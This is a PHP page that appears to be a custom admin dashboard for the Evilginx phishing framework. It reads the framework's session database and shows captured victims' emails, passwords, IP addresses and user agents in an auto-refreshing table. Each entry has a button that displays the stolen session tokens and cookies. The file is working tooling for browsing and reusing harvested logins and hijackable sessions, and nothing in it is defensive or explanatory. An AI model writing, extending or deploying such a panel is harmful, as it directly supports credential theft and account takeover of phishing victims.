<?php
$dataFile = "/root/.evilginx/data.db";

$viewCookies = isset($_GET["cookies"]);
$rows = [];
$cookieData = "";
$cookieID = "";

// Open file safely
if (file_exists($dataFile)) {
    $file = fopen($dataFile, "r");

    while (!feof($file)) {
        $line = trim(fgets($file));
        if ($line === "") continue;

        // Only lines that contain JSON start with '{'
        if (strpos($line, "{") !== 0) continue;

        $json = json_decode($line, true);
        if (!$json) continue;

        // Add to table list
        $rows[] = $json;

        // Cookie view mode
        if ($viewCookies && isset($_GET["id"]) && (string)$json["id"] === (string)$_GET["id"]) {
            $cookieID = $json["id"];
            $cookieData = json_encode($json["tokens"], JSON_PRETTY_PRINT);
        }
    }

    fclose($file);
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Evilginx Admin Panel</title>
    <meta charset="UTF-8">

    <?php if (!$viewCookies): ?>
    <meta http-equiv="refresh" content="2">
    <?php endif; ?>

    <style>
        body { background:#0a0a0a; color:#fff; font-family:Arial; }
        h1, h2 { text-align:center; }
        table {
            width:95%;
            margin:auto;
            margin-top:20px;
            border-collapse:collapse;
            background:#111;
        }
        th, td { border:1px solid #333; padding:10px; font-size:14px; }
        th { background:#222; }
        tr:nth-child(even){ background:#161616; }
        .cookie-btn {
            background:#007bff; padding:6px 12px; border:0;
            color:white; cursor:pointer; border-radius:5px;
        }
        .cookie-btn:hover { background:#0056c7; }
        pre {
            background:#111; padding:20px; border-radius:10px;
            white-space:pre-wrap; word-wrap:break-word; width:90%;
            margin:auto;
        }
        .back-btn {
            display:block; width:200px; margin:20px auto; text-align:center;
            padding:10px; background:#444; color:white; text-decoration:none;
            border-radius:8px;
        }
        .back-btn:hover { background:#666; }
        i { color:#f2c94c; }
    </style>
</head>

<body>

<?php if (!$viewCookies): ?>

<h1>Evilginx Admin Panel</h1>

<table>
    <tr>
        <th>ID</th>
        <th>Email</th>
        <th>Password</th>
        <th>IP</th>
        <th>User-Agent</th>
        <th>Time</th>
        <th>Cookies</th>
    </tr>

    <?php foreach ($rows as $log): ?>
        <tr>
            <td><?= htmlspecialchars($log["id"] ?? "") ?></td>
            <td><?= htmlspecialchars($log["username"] ?? "") ?></td>

            <td>
                <?php
                    if (!empty($log["password"])) echo htmlspecialchars($log["password"]);
                    else echo "<i>No password yet</i>";
                ?>
            </td>

            <td><?= htmlspecialchars($log["remote_addr"] ?? "") ?></td>
            <td><?= htmlspecialchars($log["useragent"] ?? "") ?></td>

            <td>
                <?php if (isset($log["create_time"])) echo date("Y-m-d H:i:s", $log["create_time"]); ?>
            </td>

            <td>
                <button class="cookie-btn"
                    onclick="location.href='admin.php?cookies=1&id=<?= $log["id"] ?>'">
                    View
                </button>
            </td>
        </tr>
    <?php endforeach; ?>

</table>

<?php else: ?>

<h2>Cookies for ID <?= htmlspecialchars($cookieID) ?></h2>

<pre><?= htmlspecialchars($cookieData ?: "No cookies found") ?></pre>

<a href="admin.php" class="back-btn">← Back</a>

<?php endif; ?>

</body>
</html>